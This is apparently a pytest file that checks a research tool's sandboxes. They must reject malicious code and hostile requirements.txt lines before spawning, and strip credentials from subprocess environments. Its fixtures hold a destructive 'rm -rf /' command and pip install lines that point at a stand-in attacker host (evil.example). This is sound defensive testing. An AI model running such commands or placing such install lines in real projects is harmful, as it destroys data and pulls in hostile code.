"""S0-1 (tasks/arch_hardening_plan.md): malicious code must be rejected at
the sandbox boundary (ExperimentSandbox / DockerSandbox), before any
subprocess spawns — not left to the caller to remember to validate."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

from berb.config import DockerSandboxConfig
from berb.experiment.docker_sandbox import DockerSandbox
from berb.experiment.sandbox import ExperimentSandbox, SandboxConfig

_MALICIOUS = "import os\nos.system('rm -rf /')"
_SAFE = "print('hello')"


class TestExperimentSandboxGate:
    @patch("berb.experiment.sandbox.subprocess.run")
    def test_run_rejects_malicious_code_without_spawning(self, mock_run, tmp_path: Path):
        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run(_MALICIOUS)

        assert result.returncode == -1
        assert "security validation" in result.stderr.lower()
        mock_run.assert_not_called()

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_run_allows_safe_code(self, mock_run, tmp_path: Path):
        from subprocess import CompletedProcess

        mock_run.return_value = CompletedProcess(args=[], returncode=0, stdout="ok\n", stderr="")
        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run(_SAFE)

        assert result.returncode == 0
        mock_run.assert_called_once()

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_run_project_rejects_malicious_file_without_spawning(self, mock_run, tmp_path: Path):
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        (project_dir / "main.py").write_text(_MALICIOUS, encoding="utf-8")

        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run_project(project_dir)

        assert result.returncode == -1
        assert "security validation" in result.stderr.lower()
        mock_run.assert_not_called()


class TestSubprocessEnvStripping:
    """S0-8 (tasks/arch_hardening_plan.md): an experiment subprocess must not
    inherit host credentials.

    Originally asserted against experiment/code_agent.py's CLI-agent Popen.
    That module was deleted (2026-09-02, D-09); the property belongs to
    safe_subprocess_env itself, which every remaining spawn site uses, so the
    test now covers the helper directly rather than one of its callers."""

    def test_secret_env_vars_are_stripped(self, monkeypatch):
        from berb.experiment.sandbox import safe_subprocess_env

        monkeypatch.setenv("MY_SERVICE_API_KEY", "sk-super-secret-value")
        monkeypatch.setenv("SOME_TOKEN", "t")
        monkeypatch.setenv("A_SECRET", "s")
        monkeypatch.setenv("DB_PASSWORD", "p")
        monkeypatch.setenv("AWS_ACCESS_KEY_ID", "AKIA")
        monkeypatch.setenv("SAFE_UNRELATED_VAR", "fine")

        env = safe_subprocess_env()

        for leaked in (
            "MY_SERVICE_API_KEY",
            "SOME_TOKEN",
            "A_SECRET",
            "DB_PASSWORD",
            "AWS_ACCESS_KEY_ID",
        ):
            assert leaked not in env
        # Not an allowlisted key either — the env is allow-list shaped, not
        # deny-list shaped, so an unrecognised variable is dropped too.
        assert "SAFE_UNRELATED_VAR" not in env

    def test_allowlisted_keys_survive(self, monkeypatch):
        from berb.experiment.sandbox import safe_subprocess_env

        monkeypatch.setenv("PATH", "/usr/bin")
        env = safe_subprocess_env()
        assert env["PATH"] == "/usr/bin"
        assert env["PYTHONUNBUFFERED"] == "1"

    def test_spawn_sites_use_the_sanitised_env(self, tmp_path: Path, monkeypatch):
        """The helper is only a control if the sandbox actually passes it."""
        from subprocess import CompletedProcess

        monkeypatch.setenv("MY_SERVICE_API_KEY", "sk-super-secret-value")
        captured: dict[str, dict[str, str]] = {}

        def _fake_run(cmd, **kwargs):
            captured["env"] = kwargs.get("env") or {}
            return CompletedProcess(args=[], returncode=0, stdout="ok\n", stderr="")

        with patch("berb.experiment.sandbox.subprocess.run", side_effect=_fake_run):
            ExperimentSandbox(SandboxConfig(), tmp_path / "work").run(_SAFE)

        assert "MY_SERVICE_API_KEY" not in captured["env"]


class TestRejectedReasonField:
    """S-6 (tasks/hardening_plan_2026-08-13.md): a security rejection sets
    the typed `rejected_reason` sentinel, not just returncode==-1, so
    callers can distinguish it from a crashed experiment."""

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_experiment_sandbox_run_sets_rejected_reason(self, mock_run, tmp_path: Path):
        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run(_MALICIOUS)

        assert result.rejected_reason is not None
        assert "security validation" in result.rejected_reason.lower()

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_experiment_sandbox_safe_run_leaves_rejected_reason_none(
        self, mock_run, tmp_path: Path
    ):
        from subprocess import CompletedProcess

        mock_run.return_value = CompletedProcess(args=[], returncode=0, stdout="ok\n", stderr="")
        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run(_SAFE)

        assert result.rejected_reason is None

    @patch("berb.experiment.docker_sandbox.subprocess.run")
    def test_docker_sandbox_run_sets_rejected_reason(self, mock_run, tmp_path: Path):
        sandbox = DockerSandbox(DockerSandboxConfig(), tmp_path / "work")
        result = sandbox.run(_MALICIOUS)

        assert result.rejected_reason is not None


class TestRequirementsTxtGate:
    """S-3 (tasks/hardening_plan_2026-08-13.md): requirements.txt is a
    separate code-execution channel (pip runs arbitrary setup.py, honors
    VCS/URL/editable installs) the .py scan never covers on its own."""

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_experiment_sandbox_rejects_vcs_install(self, mock_run, tmp_path: Path):
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        (project_dir / "main.py").write_text(_SAFE, encoding="utf-8")
        (project_dir / "requirements.txt").write_text(
            "-e git+https://evil.example/malicious-pkg\n", encoding="utf-8"
        )

        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run_project(project_dir)

        assert result.returncode == -1
        assert "requirements.txt" in result.stderr.lower()
        mock_run.assert_not_called()

    @patch("berb.experiment.sandbox.subprocess.run")
    def test_experiment_sandbox_allows_plain_requirements(self, mock_run, tmp_path: Path):
        from subprocess import CompletedProcess

        mock_run.return_value = CompletedProcess(args=[], returncode=0, stdout="ok\n", stderr="")
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        (project_dir / "main.py").write_text(_SAFE, encoding="utf-8")
        (project_dir / "requirements.txt").write_text("numpy==1.26.4\n", encoding="utf-8")

        sandbox = ExperimentSandbox(SandboxConfig(), tmp_path / "work")
        result = sandbox.run_project(project_dir)

        assert result.returncode == 0
        mock_run.assert_called_once()

    @patch("berb.experiment.docker_sandbox.subprocess.run")
    def test_docker_sandbox_rejects_index_url_override(self, mock_run, tmp_path: Path):
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        (project_dir / "main.py").write_text(_SAFE, encoding="utf-8")
        (project_dir / "requirements.txt").write_text(
            "--index-url https://evil.example/simple\nnumpy\n", encoding="utf-8"
        )

        sandbox = DockerSandbox(DockerSandboxConfig(), tmp_path / "work")
        result = sandbox.run_project(project_dir)

        assert result.returncode == -1
        assert "requirements.txt" in result.stderr.lower()
        mock_run.assert_not_called()


class TestDockerSandboxGate:
    @patch("berb.experiment.docker_sandbox.subprocess.run")
    def test_run_rejects_malicious_code_without_spawning(self, mock_run, tmp_path: Path):
        sandbox = DockerSandbox(DockerSandboxConfig(), tmp_path / "work")
        result = sandbox.run(_MALICIOUS)

        assert result.returncode == -1
        assert "security validation" in result.stderr.lower()
        mock_run.assert_not_called()

    @patch("berb.experiment.docker_sandbox.subprocess.run")
    def test_run_project_rejects_malicious_file_without_spawning(self, mock_run, tmp_path: Path):
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        (project_dir / "main.py").write_text(_MALICIOUS, encoding="utf-8")

        sandbox = DockerSandbox(DockerSandboxConfig(), tmp_path / "work")
        result = sandbox.run_project(project_dir)

        assert result.returncode == -1
        assert "security validation" in result.stderr.lower()
        mock_run.assert_not_called()
